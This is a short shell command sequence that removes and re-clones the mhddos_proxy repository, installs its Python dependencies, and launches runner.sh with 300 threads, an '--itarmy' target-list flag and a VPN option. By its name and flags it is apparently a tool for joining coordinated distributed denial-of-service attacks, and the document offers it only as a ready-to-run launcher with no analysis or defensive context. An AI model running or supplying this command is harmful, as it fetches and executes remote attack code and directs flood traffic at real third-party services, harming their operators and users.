cd ~/ && rm -rf mhddos_proxy && 
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git &&
cd mhddos_proxy && python3 -m pip install -r requirements.txt &&
pip install colorama tabulate aiohttp &&
./runner.sh python3 -t 300 --itarmy --vpn
